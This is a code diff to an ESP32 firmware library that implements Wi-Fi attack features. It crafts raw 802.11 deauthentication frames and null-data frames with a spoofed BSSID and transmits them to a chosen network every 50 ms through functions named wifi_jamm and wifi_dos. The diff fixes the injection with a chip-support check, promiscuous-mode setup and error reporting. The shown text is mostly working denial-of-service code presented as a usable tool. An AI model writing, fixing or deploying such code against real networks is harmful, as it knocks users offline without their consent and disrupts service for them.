@@ -1,4 +1,6 @@
 #include "wifi_page_library.h"
+#include "esp_wifi.h" // this is required
+#include "esp_chip_info.h"
 
 // ================== GLOBAL VARIABLES ==================
 const char **wifi_button_texts = nullptr;
@@ -10,6 +12,13 @@ int wifi_selected_index = -1;
 lv_timer_t *wifi_attack_timer = nullptr;
 bool is_jamming = false;
 bool is_dos = false;
+
+//////////////////////troubleshooter////////////
+bool is_tx_supported() {
+    esp_chip_info_t chip_info;
+    esp_chip_info(&chip_info);
+    return chip_info.model == CHIP_ESP32; // Only ESP32 classic supports 80211_tx properly
+}
 
 // ================== NETWORK SCANNING ==================
 void scanNetworks() {
@@ -32,36 +41,64 @@ void scanNetworks() {
 
 // ================== ATTACK PACKETS ==================
 
+static void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    // Optional: You can process received packets here if needed
+}
+
 // Send one Deauth packet
 static void send_deauth_packet() {
-    uint8_t deauthPacket[26] = {
+    if (!is_tx_supported()) {
+        Serial.println("[!] Deauth packet TX not supported on this chip.");
+        return;
+    }
+
+    uint8_t deauthPacket[28] = {
         0xC0, 0x00, 0x3A, 0x01,
-        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,   // Destination (broadcast)
-        0,0,0,0,0,0,                      // Source (BSSID)
-        0,0,0,0,0,0,                      // BSSID again
-        0x00, 0x00, 0x07, 0x00
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,     // Destination
+        0, 0, 0, 0, 0, 0,                       // Source
+        0, 0, 0, 0, 0, 0,                       // BSSID
+        0x00, 0x00,                             // Seq/frag
+        0x07, 0x00                              // Reason code: Class 3
     };
+
     memcpy(&deauthPacket[10], targetNetwork.bssid, 6);
     memcpy(&deauthPacket[16], targetNetwork.bssid, 6);
 
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    esp_wifi_set_promiscuous(true);
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    if (err != ESP_OK) {
+        Serial.printf("[!] Deauth TX failed: %d\n", err);
+    }
 }
 
 // Send one Null Data packet
 static void send_null_packet() {
+    if (!is_tx_supported()) {
+        Serial.println("[!] Null packet TX not supported on this chip.");
+        return;
+    }
+
     uint8_t nullPacket[24] = {
         0xC8, 0x00, 0x00, 0x00,
-        0,0,0,0,0,0,  // Destination
-        0,0,0,0,0,0,  // Source
-        0,0,0,0,0,0,  // BSSID
+        0, 0, 0, 0, 0, 0,
+        0, 0, 0, 0, 0, 0,
+        0, 0, 0, 0, 0, 0,
         0x00, 0x00
     };
-    memcpy(&nullPacket[4], targetNetwork.bssid, 6);
+
+    memcpy(&nullPacket[4],  targetNetwork.bssid, 6);
     memcpy(&nullPacket[10], targetNetwork.bssid, 6);
     memcpy(&nullPacket[16], targetNetwork.bssid, 6);
 
-    esp_wifi_80211_tx(WIFI_IF_STA, nullPacket, sizeof(nullPacket), false);
+    esp_wifi_set_promiscuous(true);
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, nullPacket, sizeof(nullPacket), false);
+    if (err != ESP_OK) {
+        Serial.printf("[!] Null TX failed: %d\n", err);
+    }
 }
+
 
 // ================== TIMER CALLBACK ==================
 
@@ -82,15 +119,19 @@ void wifi_jamm() {
 
     wifi_jamm_stop(); // Ensure no previous attack still running
 
-    WiFi.mode(WIFI_MODE_STA);
-    WiFi.disconnect();
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_MODE_STA); // ✅ Prefer STA only
     delay(100);
+
     esp_wifi_set_channel(targetNetwork.channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_promiscuous(true); // ✅ Enable raw TX
+    esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);
 
     is_jamming = true;
     is_dos = false;
 
     wifi_attack_timer = lv_timer_create(wifi_attack_timer_cb, 50, NULL); // 50ms
+
 }
 
 // ================== DOS ATTACK ==================
@@ -101,10 +142,13 @@ void wifi_dos() {
 
     wifi_jamm_stop(); // Ensure no previous attack still running
 
-    WiFi.mode(WIFI_MODE_STA);
-    WiFi.disconnect();
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_MODE_STA); // ✅ Prefer STA only
     delay(100);
+
     esp_wifi_set_channel(targetNetwork.channel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_promiscuous(true); // ✅ Enable raw TX
+    esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);
 
     is_jamming = false;
     is_dos = true;
